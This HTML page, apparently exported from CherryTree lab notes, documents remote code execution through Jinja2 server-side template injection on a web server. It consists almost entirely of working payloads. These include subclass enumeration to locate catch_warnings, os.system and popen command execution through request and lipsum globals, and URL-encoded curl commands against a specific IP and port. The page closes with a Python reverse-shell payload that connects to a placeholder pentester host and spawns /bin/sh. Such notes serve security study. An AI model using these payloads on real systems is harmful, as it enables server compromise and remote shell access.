<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. RCE on the Webserver</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. RCE on the Webserver</h1><br/><br /><h3>1. </h3><strong><h3>Find the index of the </h3></strong><strong><h3>catch_warning</h3></strong><strong><h3> class</h3></strong><br />print out the number and the method names using the following payload<br />   1) Payload<br />    <div class="codebox"><pre>{% for i in range(450) %} {{ i }}{{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[i].__name__ }}{% endfor %}</pre></div><br />   2) That url encoded is:<br />    <div class="codebox"><pre>%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%7B%25%20endfor%20%25%7D</pre></div><br />   3) Concatenated in the cURL command<br />    <div class="codebox"><pre>curl &quot;http://167.71.139.192:31321/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%7B%25%20endfor%20%25%7D&quot; -gs | grep &#39;catch_warnings&#39;<br /></pre></div><br />    <a href=""><img src="images/2583-1.png" alt="images/2583-1.png" /></a><br />    catch_warnings is located at index #<span style="color:#ff0000;">214</span><br /><br />2. <strong><h3>Now we can send the RCE payload</h3></strong><br />   Below some examples of RCE<br /><br />• Create a file on the target on /tmp<br />   1) Payload<br />     <div class="codebox"><pre>{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&quot;touch /tmp/testdaniele&quot;) }}</pre></div><br />   2) url encoded is:<br />    <div class="codebox"><pre>%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20/tmp/testdaniele%22%29%20%7D%7D</pre></div><br />   3) Concatenated in the cURL command<br />    <div class="codebox"><pre>curl &quot;http://167.71.139.192:31321/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20/tmp/testdaniele%22%29%20%7D%7D&quot; -gs<br /></pre></div><br />    <a href=""><img src="images/2583-2.png" alt="images/2583-2.png" /></a><br />    The application returns 0 in its response. This is the return of the value of the command we just executed. 0 indicates that the command was executed without errors.<br />   4) We can identify if testdaniele was created using (ls /tmp)<br />       <div class="codebox"><pre>{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls /tmp&#39;).read()}}</pre></div><br />   5) url encoded is<br />    <div class="codebox"><pre>%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D</pre></div><br />   6) curl command<br />       <div class="codebox"><pre>curl &quot;http://167.71.139.192:31321/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D&quot; -gs</pre></div><br />        <a href=""><img src="images/2583-3.png" alt="images/2583-3.png" /></a><br /><br /><br /><strong>RCE using Specific Jinja2 functions</strong><br />Specific Jinja2 functions that we can use to exploit of Jinja2 SSTI vulnerabilities<br />   ◇ request<br />   ◇ lipsum<br /><br />• <span style="text-decoration:underline;">Request</span><br />   1) Payload:<br />    <div class="codebox"><pre>{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}</pre></div><br />   2) url encoded<br />       <div class="codebox"><pre>%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D</pre></div><br />   3) curl command<br />    <div class="codebox"><pre>curl &quot;http://167.71.139.192:31321/execute?cmd=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D&quot; -gs</pre></div><br />    <a href=""><img src="images/2583-4.png" alt="images/2583-4.png" /></a><br /><br /><br />• <span style="text-decoration:underline;">Lipsum</span><br />   1) Payload<br />    <div class="codebox"><pre>{{lipsum.__globals__.os.popen(&#39;id&#39;).read()}}</pre></div><br />   2) url encoded is:<br />       <div class="codebox"><pre>%7B%7Blipsum.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D</pre></div><br />   3) curl command:<br />      <div class="codebox"><pre>curl &quot;http://167.71.139.192:31321/execute?cmd=%7B%7Blipsum.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D&quot; -gs<br /></pre></div><br />      <a href=""><img src="images/2583-5.png" alt="images/2583-5.png" /></a><br />    <br /><strong>Payload Reverse Shell</strong><br />    <div class="codebox"><pre>{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;python -c \&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span style="color:#7f0044;font-weight:400">&lt;PENTESTER_IP&gt;</span>&quot;,<span style="color:#7f0044;font-weight:400">&lt;PENTESTER_PORT&gt;</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)\&#39;&#39;).read()}}<br /></pre></div></div>
</body>
</html>
